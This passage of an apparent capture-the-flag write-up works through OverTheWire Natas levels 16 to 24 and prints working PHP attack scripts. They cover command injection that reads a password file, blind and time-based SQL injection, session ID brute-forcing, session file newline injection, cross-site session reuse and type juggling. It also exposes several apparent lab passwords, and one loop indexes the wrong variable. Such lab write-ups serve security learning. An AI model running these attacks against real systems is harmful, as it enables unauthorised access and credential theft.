<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

Hey, this looks kinda familiar! Takes me all the way back to levels 9 and 10.

We're back to dictionary.txt, but this time, there's even filtering of characters. No semicolons... not much of a chance of executing a command. Or is there? What if instead of separating commands with a semicolon, we embed our command inside of grep?

Here's an example of what I'm thinking:

We query `whirlpools$(grep [character] /etc/natas_webpass/natas17)`, which to `passthru()` looks like:

`grep -i "whirlpools$(grep [character] /etc/natas_webpass/natas17)" dictionary.txt`

If "a" for example exists within the password, then nothing should be echoed back because "whirlpools" is unique in the dictionary. There's no such thing as "whirlpoolsa", therefore it should return nothing from the dictionary. But if "a" does not exist in the password, then nothing will be tacked onto "whirlpools", and "whirlpools" will be echoed back to us.

This is starting to look similar enough to the last one, I think we can reuse much of our PHP.

~~~~
<?php

function get($url)
{
    $username = "natas16";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    //whirlpools$(grep a /etc/natas_webpass/natas17)
    $command = urlencode("whirlpools$(grep $character /etc/natas_webpass/natas17)");
    $r = get("http://natas16.natas.labs.overthewire.org/index.php?needle=$command");
    if (!strpos($r, "whirlpools"))
    {
        $library .= $character;
    }
}

var_dump($library);
~~~~

Outputs: `string(26) "bcdghkmnqrswAGHNPQSW035789"`

Heck yeah, it worked! Now we need to check each of these for the 32 positions of the password, just like last time.

~~~~
<?php

function post($url, $data)
{
    $username = "natas16";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"%$character%\"#"]);
    if (strpos($r, "<br>This user exists.<br>"))
    {
        $library .= $character;
    }
}

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$i];
        $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"$password$character%\"#"]);
        if (strpos($r, "<br>This user exists.<br>"))
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}
~~~~
And once again, we watch the password build before our very eyes.


## Natas 17 🡆 Natas 18

~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas17</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Oh c'mon, now they're just playing hardball. Seriously? Commenting out all the echo statements? Well, no matter. We're smart, we can think of a way.

MySQL has a `sleep()` function... what if we injected some logic into our query, and told it to sleep for 5 seconds if it found something?

Something like: `natas18" AND IF(password LIKE BINARY "%a%", sleep(5), null) #`

Where "a" is the character we're testing, and if it's somewhere in "password", it sleeps... commenting out the rest of the SQL after our query, of course.

Let's rejig our PHP from a while ago to test this.

~~~~
<?php

function get($url)
{
    $username = "natas17";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';


for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $query = urlencode("natas18\" AND IF(password LIKE BINARY \"%$character%\", sleep(5), null) #");
    $start = time();
    $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
    $end = time();
    if ($end - $start > 4)
    {
        $library .= $character;
    }
}

var_dump($library);
~~~~

In theory, this should give us our library. Let's run it.

`string(24) "dghjlmpqsvwxyCDFIKOPR047"`

Haha! We did it! Let's use the sleep strategy again, in the same loop we've been using for the past few challenges.

~~~~
<?php

function get($url)
{
    $username = "natas17";
    $password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';


for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $query = urlencode("natas18\" AND IF(password LIKE BINARY \"%$character%\", sleep(5), null) #");
    $start = time();
    $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
    $end = time();
    if ($end - $start > 4)
    {
        $library .= $character;
    }
}

var_dump($library);

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$j];
        $query = urlencode("natas18\" AND IF(password LIKE BINARY \"$password$character%\", sleep(5), null) #");
        $start = time();
        $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
        $end = time();
        if ($end - $start > 4)
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}
~~~~
Beautiful! I kinda like this little brute-forcer template I've written, it's coming in handy quite a bit in these challenges.


## Natas 18 🡆 Natas 19
~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas18</h1> 
<div id="content"> 
<? 

$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin() { /* {{{ */ 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
/* }}} */ 
function isValidID($id) { /* {{{ */ 
    return is_numeric($id); 
} 
/* }}} */ 
function createID($user) { /* {{{ */ 
    global $maxid; 
    return rand(1, $maxid); 
} 
/* }}} */ 
function debug($msg) { /* {{{ */ 
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 
/* }}} */ 
function my_session_start() { /* {{{ */ 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
    if(!session_start()) { 
        debug("Session start failed"); 
        return false; 
    } else { 
        debug("Session start ok"); 
        if(!array_key_exists("admin", $_SESSION)) { 
        debug("Session was old: admin flag set"); 
        $_SESSION["admin"] = 0; // backwards compatible, secure 
        } 
        return true; 
    } 
    } 

    return false; 
} 
/* }}} */ 
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 
/* }}} */ 

$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
    session_id(createID($_REQUEST["username"])); 
    session_start(); 
    $_SESSION["admin"] = isValidAdminLogin(); 
    debug("New session started"); 
    $showform = false; 
    print_credentials(); 
    } 
}  

if($showform) { 
?> 

<p> 
Please login with your admin account to retrieve credentials for natas19. 
</p> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Interesting. Looks like this one's all about sessions. Judging by a cursory glance at the code, 640 of them according to the `$maxid` variable. Also, it appears that one of these sessions has an "admin" attribute, that if set, gives us the credentials for the next challenge.

Haha, I love this comment:

`// 640 should be enough for everyone`

Enough for everyone, indeed... *everyone including the admin!*

Honestly, my gut reaction is to just try every one of the 640 session IDs one-by-one until it coughs up the credentials. I can see here that it says `You are an admin.` if it's the correct session ID, and `You are logged in as a regular user.` if it's not, so that's an easy pass/fail test. Yep... looks like we've got a brute-force attack to concoct! Let's write some PHP.

~~~~
<?php

function get($url, $i)
{
    $username = "natas18";
    $password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
                       . "authorization: Basic $string\r\n"
                       . "cookie: PHPSESSID=$i",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

for ($i = 0; $i < 641; $i++)
{
    echo "Checking $i\r\n";
    $response = get("http://natas18.natas.labs.overthewire.org", $i);
    if (strpos($response, "You are an admin."))
    {
        $password = substr($response, strpos($response, "Password: ") + 10, 32);
        exit("Got it! Session ID $i is Admin.\r\nNatas19 Password: $password");
    }
    elseif (!strpos($response, "You are logged in as a regular user."))
    {
        var_dump($response);
    }
}
~~~~

Alright, let's run it and see if it spits back anything useful.

~~~~
$ php natas18.php
...
Checking 118
Checking 119
Got it! Session ID 119 is Admin.
Natas19 Password: [censored]
~~~~

Mental note: Don't make session IDs iterable.


## Natas 19 🡆 Natas 20


___
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>

<p>
Please login with your admin account to retrieve credentials for natas20.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>

___

Well, they say it's not sequential anymore... let's see if that's true. I'll take a peek at what it gave me for a cookie:

`3436352d`

Hm... that looks like hex. What's it say in ASCII?

`465-`

Interesting. Let's try some more, and see if we notice any patterns.

`198-`, `356-`, `609-`, `470-`, `125-`

Looks like there's always a trailing dash. You know... I haven't been putting anything in the username and password fields to get these cookies... I'm thinking maybe I should try doing that now. Let's try `admin` for the username, and junk text for the password.

`3235342d61646d696e`

That's quite a bit longer! Let's see what it says in ASCII.

`254-admin`

Ha! I bet that dash is to separate the username from the session ID. Let's try a few more just to make sure.

`626-testing`, `318-moretesting`, `223-makingsurethisisntrandom`

Alright, I think we've verified that is our username input after the dash. Something else I've noticed in these tests: I haven't seen any numbers higher than 640. I bet the limit is still the same as the last challenge... In fact, I bet the only difference is that dash and username tacked onto the end of the session ID, and hex-encoding the whole thing. Let's tweak our PHP from last challenge and see if we're right.

~~~~
<?php

function get($url, $i)
{
    $username = "natas19";
    $password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
                       . "authorization: Basic $string\r\n"
                       . "cookie: PHPSESSID=$i",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

for ($i = 0; $i < 641; $i++)
{
    $session = bin2hex("$i-admin");
    echo "Checking $session\r\n";
    $response = get("http://natas19.natas.labs.overthewire.org", $session);
    if (strpos($response, "You are an admin."))
    {
        $password = substr($response, strpos($response, "Password: ") + 10, 32);
        exit("Got it! Session ID $session is Admin.\r\nNatas20 Password: $password");
    }
    elseif (!strpos($response, "You are logged in as a regular user."))
    {
        var_dump($response);
    }
}
~~~~

And... run!

~~~~
$ php natas19.php
...
Checking 3238302d61646d696e
Checking 3238312d61646d696e
Got it! Session ID 3238312d61646d696e is Admin.
Natas20 Password: [censored]
~~~~

Ha! Bingo!


## Natas 20 🡆 Natas 21


___
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___


~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas20</h1> 
<div id="content"> 
<? 

function debug($msg) { /* {{{ */ 
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 
/* }}} */ 
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas21\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."; 
    } 
} 
/* }}} */ 

/* we don't need this */ 
function myopen($path, $name) {  
    //debug("MYOPEN $path $name");  
    return true;  
} 

/* we don't need this */ 
function myclose() {  
    //debug("MYCLOSE");  
    return true;  
} 

function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 

function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
} 

/* we don't need this */ 
function mydestroy($sid) { 
    //debug("MYDESTROY $sid");  
    return true;  
} 
/* we don't need this */ 
function mygarbage($t) {  
    //debug("MYGARBAGE $t");  
    return true;  
} 

session_set_save_handler( 
    "myopen",  
    "myclose",  
    "myread",  
    "mywrite",  
    "mydestroy",  
    "mygarbage"); 
session_start(); 

if(array_key_exists("name", $_REQUEST)) { 
    $_SESSION["name"] = $_REQUEST["name"]; 
    debug("Name set to " . $_REQUEST["name"]); 
} 

print_credentials(); 

$name = ""; 
if(array_key_exists("name", $_SESSION)) { 
    $name = $_SESSION["name"]; 
} 

?> 

<form action="index.php" method="POST"> 
Your name: <input name="name" value="<?=$name?>"><br> 
<input type="submit" value="Change name" /> 
</form> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Still looks like sessions, but it's already logged us in. All we've got is the option to change our name! How could that possibly offer any privilege escalation?

Let's start by taking a look at what it wants:

`if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)`

Alright, as long as it finds `admin 1` in the session file, we're in. So on that note, let's take a look at how it handles our only input: our name.

~~~~
if(array_key_exists("name", $_REQUEST)) { 
    $_SESSION["name"] = $_REQUEST["name"]; 
    debug("Name set to " . $_REQUEST["name"]); 
}
~~~~

Woah! They're just throwing our input into the session file without any filtering?! That opens up some possibilities... To help us think of ways to attack this, let's first understand PHP session file. Session files separate key/value pairs with newline characters, and they keys and values themselves by spaces. So on the natas20 server, `$_SESSION["admin"] == 1`would look like:

~~~~
admin 1
~~~~

So, we can expect the session file for our non-admin user to look something like this:

~~~~
name bob
~~~~

We need to get `admin 1` in there in order to advance, and we have direct control over what goes in this file... What if we included a newline character in our "name", and then `admin 1` after that? Something like: `bob\nadmin 1`

In theory, it should look something like this, when we're done:

~~~~
name bob
admin 1
~~~~

Which *should* give us the credentials for the next level, according to the program.

`http://natas20.natas.labs.overthewire.org/?name=bob%0Aadmin%201`

Returns:

___
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: [censored]</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="bob
admin 1"><br>
<input type="submit" value="Change name">
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Success!

Another mental note: NEVER give users direct access to what's being stored!


## Natas 21 🡆 Natas 22


___
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>


___

Colocated, huh? Hosting different websites on the same server provides some interesting routes of attack. Let's go check out `http://natas21-experimenter.natas.labs.overthewire.org`

___
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Looks like we've got some input! Let's see what the source looks like.

~~~~
<html> 
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head> 
<body> 
<h1>natas21 - CSS style experimenter</h1> 
<div id="content"> 
<p> 
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b> 
</p> 
<?   

session_start(); 

// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 

if(array_key_exists("debug", $_GET)) { 
    print "[DEBUG] Session contents:<br>"; 
    print_r($_SESSION); 
} 

// only allow these keys 
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 
$form = ""; 

$form .= '<form action="index.php" method="POST">'; 
foreach($validkeys as $key => $defval) { 
    $val = $defval; 
    if(array_key_exists($key, $_SESSION)) { 
    $val = $_SESSION[$key]; 
    } else { 
    $_SESSION[$key] = $val; 
    } 
    $form .= "$key: <input name='$key' value='$val' /><br>"; 
} 
$form .= '<input type="submit" name="submit" value="Update" />'; 
$form .= '</form>'; 

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; 
$example = "<div style='$style'>Hello world!</div>"; 

?> 

<p>Example:</p> 
<?=$example?> 

<p>Change example values here:</p> 
<?=$form?> 

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Dang, these people are just so trusting! Look at this:

~~~~
// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 
~~~~

It's almost like they can't help themselves from storing user-submitted data right into a session file. We can put whatever keys we want into our request, and this script is going to just throw everything in there for us.

As an aside: by default, PHP5 stores all session files in the same, common folder... regardless of which website they came from. Which means you can pick up a session that you started on one co-located website, from a different one.

I'm kinda thinking of POSTing `admin=1` into this co-located website, and seeing if we can use that technique against the main challenge site.

Alright, so first up, let's hit refresh and get our session ID that we'll be using for this attack.

natas21 gave us: `4km4nt8vlu6kuuv7rq1r52abf5`

Alright, now we make a POST request against natas21-experimenter using that session ID... We'll just send `admin=1` and see if it stores.

~~~~
[DEBUG] Session contents:<br>Array
(
    [admin] => 1
)
~~~~

Alright, cool! It wrote! Let's head back to natas21 and see if we can use that.

Just going to hit refresh, and...

___
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: [censored]</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Ta-da! We successfully used a single session across two co-located sites.

Mental note: segregate sessions from different sites when hosting on the same server.

## Natas 22 🡆 Natas 23


___
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Haha... blank page? Alright, whatever, let's see what we've got.

~~~~
<? 
session_start(); 

if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
    header("Location: /"); 
    } 
} 
?> 


<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas22</h1> 
<div id="content"> 

<? 
    if(array_key_exists("revelio", $_GET)) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas23\n"; 
    print "Password: <censored></pre>"; 
    } 
?> 

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Huh, not a lot going on.

"If array_key_exists("revelio", $_GET)..." alright, maybe it's that easy. Let's enter `http://natas22.natas.labs.overthewire.org/?revelio` in our URL bar and see what happens.

And... what the?!

The URL changed to `http://natas22.natas.labs.overthewire.org`... Ugh, must be a 302 header or something being pased to us.

~~~~
if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
    header("Location: /"); 
    } 
} 
~~~~

Ah, yep, `header("Location: /");` right there. No biggie, let's use cURL to get the response without following it.

Let's do `$ curl http://natas22.natas.labs.overthewire.org/?revelio --user natas22:[censored]`, and then I like to add `-v` so I can see the response headers.

____
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: [censored]</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

____

Nice, and easy. What we learned today is that just because you tell a browser to do something, doesn't mean it's going to do it. By ignoring the `Location` header, we were able to snatch the password.


## Natas 23 🡆 Natas 24


~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

Another nice, simple challenge. Here it's checking if "iloveyou" exists in the password we give it, but at the same time... it's checking if the password is greater than 10? How can something that contains "iloveyou" *also* be greater than 10?

Something's up, let's go look at how PHP treats casting strings to integers.

`var_dump((int)"10");` outputs as you'd expect.. `int(10)`

`var_dump((int)"ten");` outputs `int(0)`, because it couldn't parse an integer.

What if we have numbers mixed with letters in our string?

`var_dump((int)"ten10");` outputs `int(0)`, so it couldn't find anything there...

But `var_dump((int)"10ten");` outputs `int(10)`! The integer is in front of the letters, so it treats that as the value.

Alright, intersting... By that logic, we could do something like `11iloveyou` for the challenge. "iloveyou" still exists in the password, so that satisfies the first argument, and the leading "11" should satisfy the second argument by being greater than 10.

Let's see if it takes it.

___
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: [censored]</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Ha! Success!


## Natas 24 🡆 Natas 25


~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
